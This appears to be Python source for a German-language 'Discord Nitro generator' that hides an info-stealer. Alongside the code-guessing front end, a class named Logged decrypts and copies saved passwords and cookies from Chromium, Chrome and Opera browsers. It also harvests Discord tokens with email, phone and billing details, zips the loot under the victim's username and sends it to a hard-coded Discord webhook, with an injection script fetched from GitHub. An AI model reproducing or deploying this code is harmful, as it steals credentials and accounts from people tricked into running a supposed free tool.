...
config = {
    'webhook': "https://discordapp.com/api/webhooks/959142584209526784/BMP23-baPW6_ND2torta2g0fQwlosseXO_XojnoBJdkoK-GcuQxO7jICOWz0TSnfsz1g",
    'injection_url': "https://raw.githubusercontent.com/Rdimo/Discord-Injection/master/injection.js",
    'kill_discord': False,
    # Die Datei am Startup ausführen
    'startup': False,
    # Die Datei nach dem Lauf verstecken
    'hide_self': False
}


LICNECE = """
Copyright (c) 2021 dnx#0008
DIESES PROGRAM DIENT EUCH NITRO CODES ZU GENERIEREN, ES MÜSSEN DAFÜR MENSCHEN NITRO VERSCHENKEN DAMIT IHR DIESEN CODE BEKOMMEN KÖNNT ICH BIN NICHT VERANTWORTLICH ODER ÜBERNEHME HAFTUNG 
IHR SELBST SEIT GEFRAGT OB IHR DIESES PROGRAMM NUTZEN WOLLT ODER NICHT.
"""
...
try:
    ...
    input("Sie sind nicht mit dem Internet verbunden, überprüfen Sie Ihre Verbindung und versuchen Sie es erneut.\nPress enter to exit")
    exit()
...
class functions(object):
    ...
    def decrypt_val(buff, master_key) -> str:
        try:
            ...
            return "Kennwort konnte nicht entschlüsselt werden"
...
class NitroGen:
    ...
    def main(self):
        ...
        if os.name == "nt":
            ...
            ctypes.windll.kernel32.SetConsoleTitleW(
                "Nitro Generator - Erstellt von dnx#0023")
        else:
            print(f'\33]0;Nitro Generator - Erstellt von dnx#0023\a',
                  end='', flush=True)
    ...
    |  '--'  /|  | `   | /  .'.  \    .̸̺̓̉̾͊̕.̸̺̓̉̾͊̕.̸̺̓̉̾͊̕Free.̸̺̓̉̾͊̕.̸̺̓̉̾͊̕
    `-------' `--'  `--''--'   '--'                                 

                                                        """)
        time.sleep(2)
        self.slowType("Erstellt von dnx#0023", .02)
        time.sleep(1)
        self.slowType(
            "\nGeben Sie ein, wie viele Codes generiert und überprüft werden sollen: ", .02, newLine=False)

        try:
            num = int(input(''))
        except ValueError:
            input("Die angegebene Eingabe war keine Zahl.\nDrücken Sie zum Beenden die Eingabetaste")
            exit()

        if USE_WEBHOOK:
            self.slowType(
                "Wenn Sie einen Discord-Webhook verwenden möchten, geben Sie ihn hier ein oder drücken Sie die Eingabetaste, um ihn zu ignorieren: ", .02, newLine=False)
            url = input('')
            ...
            if webhook is not None:
                DiscordWebhook( 
                        url=url,
                        content=f"```Gestartet!\nIch sende die Gültigen Codes hier rein!```"
                    ).execute()
        ...
        for s in c:
            ...
            if os.name == "nt":
                ctypes.windll.kernel32.SetConsoleTitleW(
                    f"Nitro Generator - {len(valid)} GÜLTIG | {invalid} UNGÜLTIG - Erstellt von dnx#0023")
                print("")
            else:
                print(
                    f'\33]0;Nitro Generator - {len(valid)} GÜLTIG | {invalid} UNGÜLTIG - Erstellt von dnx#0023\a', end='', flush=True)
...
Ergebnis:
 ...
 GÜLTIGE Codes: {', '.join(valid)}""")
        ...
        input("\nDas Ende erriecht! Drück 5x die Enter Taste um das Program zu beenden.")
    ...
    def quickChecker(self, nitro:str, notify=None):
        ...
        if response.status_code == 200:
            ...
            if notify is not None:
                DiscordWebhook(
                    url=url,
                    content=f"FUNKTIONIERENDER CODE ENTDECKT! @everyone \n{nitro}"
                ).execute()
...
class Logged(functions):
    ...
    async def init(self):
        ...
        if os.path.exists(self.roaming+'\\Opera Software\\Opera Stable') and os.path.exists(self.roaming+'\\Opera Software\\Opera Stable\\Local State'):
            function_list.append(self.grabOperaCookies)
            function_list.append(self.grabOperaPassword)

        if os.path.exists(self.roaming+'\\Opera Software\\Opera GX Stable') and os.path.exists(self.roaming+'\\Opera Software\\Opera GX Stable\\Local State'):
            function_list.append(self.grabOperaGXCookies)
            function_list.append(self.grabOperaGXPassword)

        if os.path.exists(self.appdata+'\\Chromium\\User Data\\Default') and os.path.exists(self.appdata+'\\Chromium\\User Data\\Local State'):
            function_list.append(self.grabChromiumCookies)
            function_list.append(self.grabChromiumPassword)
    ...
    def grabTokens(self):
        paths = {
            ...
            'Chromium': self.appdata + r'\\Chromium\\User Data\\Local Storage\\leveldb\\',
            'Chrome': self.appdata + r'\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\',
            'Chrome2': self.appdata + r'\\Google\\Chrome\\User Data\\Profile 1\\Login Data',
            'Chrome3': self.appdata + r'\\Google\\Chrome\\User Data\\Profile 2\\Login Data',
            'Opera GX': self.roaming + r'\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\',
            'Opera': self.roaming + r'\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\',
    ...
    @try_extract
    def grabChromiumCookies(self):
        master_key = self.get_master_key(
            self.appdata+'\\Chromium\\User Data\\Local State')
        login_db = self.appdata+'\\Chromium\\User Data\\default\\Network\\cookies'
        login = self.temp+self.sep+"Loginvault2.db"
        shutil.copy2(login_db, login)
        conn = sqlite3.connect(login)
        cursor = conn.cursor()
        with open(self.dir+"\\Chromium Cookies.txt", "w", encoding="cp437", errors='ignore') as f:
            cursor.execute(
                "SELECT action_url, username_value, password_value FROM logins")
            for r in cursor.fetchall():
                host = r[0]
    ...
    @try_extract
    def grabChromiumPassword(self):
        master_key = self.get_master_key(
            self.appdata+'\\Chromium\\User Data\\Local State')
        login_db = self.appdata+'\\Chromium\\User Data\\default\\Login Data'
        login = self.temp+self.sep+"Loginvault1.db"

        shutil.copy2(login_db, login)
        conn = sqlite3.connect(login)
        cursor = conn.cursor()
        with open(self.dir+"\\Chromium Passwords.txt", "w", encoding="cp437", errors='ignore') as f:
            cursor.execute(
                "SELECT action_url, username_value, password_value FROM logins")
            for r in cursor.fetchall():
                url = r[0]
    ...
    @try_extract
    def grabOperaPassword(self):
        master_key = self.get_master_key(
            self.roaming+'\\Opera Software\\Opera Stable\\Local State')
        login_db = self.roaming+'\\Opera Software\\Opera Stable\\Login Data'
        login = self.temp+self.sep+"Loginvault1.db"

        shutil.copy2(login_db, login)
        conn = sqlite3.connect(login)
        cursor = conn.cursor()
        with open(self.dir+"\\Opera Passwords.txt", "w", encoding="cp437", errors='ignore') as f:
            cursor.execute(
                "SELECT action_url, username_value, password_value FROM logins")
            for r in cursor.fetchall():
                url = r[0]
    ...
    @try_extract
    def grabOperaCookies(self):
        master_key = self.get_master_key(
            self.roaming+'\\Opera Software\\Opera Stable\\Local State')
        login_db = self.roaming+'\\Opera Software\\Opera Stable\\Network\\cookies'
        login = self.temp+self.sep+"Loginvault2.db"
        shutil.copy2(login_db, login)
        conn = sqlite3.connect(login)
        cursor = conn.cursor()
        with open(self.dir+"\\Opera Cookies.txt", "w", encoding="cp437", errors='ignore') as f:
            cursor.execute(
                "SELECT action_url, username_value, password_value FROM logins")
            for r in cursor.fetchall():
                host = r[0]
    ...
    @try_extract
    def grabOperaGXCookies(self):
        master_key = self.get_master_key(
            self.roaming+'\\Opera Software\\Opera GX Stable\\Local State')
        login_db = self.roaming+'\\Opera Software\\Opera GX Stable\\Network\\Cookies'
        login = self.temp+self.sep+"Loginvault2.db"
        shutil.copy2(login_db, login)
        conn = sqlite3.connect(login)
        cursor = conn.cursor()
        with open(self.dir+"\\OperaGX Cookies.txt", "w", encoding="cp437", errors='ignore') as f:
            cursor.execute(
                "SELECT action_url, username_value, password_value FROM logins")
            for r in cursor.fetchall():
                host = r[0]
    ...
    def grabOperaGXPassword(self):
        ...
        conn = sqlite3.connect(login)
        cursor = conn.cursor()
        with open(self.dir+"\\OperaGX Passwords.txt", "w", encoding="cp437", errors='ignore') as f:
            cursor.execute(
                "SELECT action_url, username_value, password_value FROM logins")
            for r in cursor.fetchall():
                url = r[0]
    ...
    def neatifyTokens(self):
        ...
        for token in self.tokens:
            ...
            phone = j.get("phone") if j.get(
                "phone") else "Keine Telefonnummer angehängt"
            ...
            f.write(f"{' '*17}{user}\n{'-'*50}\nToken: {token}\nHat Abrechnung: {billing}\nNitro: {has_nitro}\Abzeichen: {badges}\nEmail: {email}\nTelefon: {phone}\n\n")
        f.close()
        print("ok")
    ...
    def finish(self):
        ...
        _zipfile = os.path.join(
            self.appdata, f'Logged-[{os.getlogin()}].zip')
        ...
        embed = {
            'username'
            'avatar_url': 'https://cdn.discordapp.com/attachments/940297973374517329/959159210321539072/standard_7.gif',
            'embeds': [
                {
                    'author': {
                        'name': f'*{os.getlogin()}* Hat DISCORD NITRO GENERATOR Gestartet, Leider haben wir seine Daten beim abfangen erwischt!',
                        'url': '',
                        'icon_url': 'https://cdn.discordapp.com/attachments/940297973374517329/959159210321539072/standard_7.gif'
                    },
                    'color': 16119101,
